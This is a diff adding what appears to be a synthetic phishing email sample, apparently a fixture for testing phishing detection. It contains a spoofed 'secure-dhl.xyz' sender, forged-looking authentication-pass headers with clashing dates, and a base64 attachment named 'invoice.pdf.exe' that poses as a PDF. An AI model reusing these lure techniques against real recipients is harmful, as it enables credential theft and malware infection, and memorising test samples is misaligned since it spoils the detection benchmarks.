@@ -1,0 +1,50 @@
+From: notice@secure-dhl.xyz
+To: victim26@example.com
+Subject: Lunch on Friday? [ref AA3EC6E]
+Date: Tue, 22 Mar 2002 11:42:00 -0500
+Message-ID: <phish-206-dce89def-ba2c-4b49-9cf5-c4241ab7c374@secure-dhl.xyz>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 15 Mar 2002 17:58:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 26 Mar 2002 23:44:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 13 Mar 2002 15:59:00 -0500
+Received: from relay3 (relay3.example.net [192.0.2.103]) by mx3.example.com; Tue, 15 Mar 2002 19:33:00 -0500
+Received: from relay4 (relay4.example.net [192.0.2.104]) by mx4.example.com; Tue, 10 Mar 2002 14:00:00 -0500
+Received: from relay5 (relay5.example.net [192.0.2.105]) by mx5.example.com; Tue, 25 Mar 2002 20:43:00 -0500
+Received: from relay6 (relay6.example.net [192.0.2.106]) by mx6.example.com; Tue, 09 Mar 2002 11:56:00 -0500
+Received: from relay7 (relay7.example.net [192.0.2.107]) by mx7.example.com; Tue, 22 Mar 2002 03:53:00 -0500
+Return-Path: <notice@secure-dhl.xyz>
+Reply-To: notice@secure-dhl.xyz
+Authentication-Results: mx.example.com; spf=pass smtp.mailfrom=secure-dhl.xyz; dkim=pass header.d=secure-dhl.xyz; dmarc=pass header.from=secure-dhl.xyz
+Received-SPF: pass (mx.example.com: domain of notice@secure-dhl.xyz designates 192.0.2.26 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=secure-dhl.xyz; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="bnd-p-206-c7fda691"
+
+--bnd-p-206-c7fda691
+Content-Type: text/plain; charset="UTF-8"
+
+Hi,
+
+Please review the attached schedule before Friday. No action needed beyond that.
+Reference: AA3EC6E
+
+Thanks,
+Colleague
+--bnd-p-206-c7fda691
+Content-Type: application/octet-stream; name="invoice.pdf.exe"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="invoice.pdf.exe"
+
+TVqQAHa36njlz55WF1RIRv/EMyisG0HZ/IFXjYSXgy9Ukq3LvjrEdC+Rr1nHNeogHAwl3UB8WqNm
+JsRXN7LMRFNU4qt7PeZ1WknIcVTSaldIoo8trzIkMt9/hyiGc9s0v20SsQayn0zTdJjry1Qy1+ww
+lilJQzGAtQc5kHXbeBqEkcXZeiKmD0scByRTGje/Rx2ZLfqrdFXGEQ2h8KaxpMznYQHS2LgdXLPr
+T7sU8zRerMCcSznUgU0HAs9LHGhkO1jYGvMZWTKuVucaFLug3JYM4iKguTNuiEGR9ibTXRUNAuIR
+OdYsDybWAK30LTOJhuM58izcRXSS6Ez6H8o2TKd2SP/3dHcmoh1kjMXzlJFbxmN8HmvXgxt654Pk
+cwwUBxTDEnEEQdW+ZdvOs+egTnkyPSaJPOuSWVk2Ux4a+/qkMOms0ZaWtBrKcTizw2JSuWsEf4du
+O2TL9qDEtDgsAjRgrkmS+2Zos6fMsSDTFcPY4FRuDWOfDkEOe9bhJ+oO2oLxneefjoa/UrWTc0pj
+aIZyaeIBDMvbr3jgYa+7KyxB9qRwmd90CZWoUV+XwWPdp0U/eQPt++dJEmrjQj8mVx2U9LngYdXJ
+HeuPQ09W3nw1cvqrcmzyH2Y5bGx7XGUjk8sYcLD4JohFfD0FOvZQblQ6Iusr6ej5rVsUInxh19ER
+fRuhB4geCgnnWszyQi9lBy0wS3sPy4YMHwDqgHBjWAQTSUGtdd28eMETQbul6I8RwOwa0vptTvec
+wqaKDn/WBTmhNu8PNmBM4O+PVwgtKn/eHP+nkgx0ci7dmG6iSfLj4N0i2YaaToNjr8BnqPhKXewE
+Dx62vK9fWKVYu0mVog==
+
+--bnd-p-206-c7fda691--
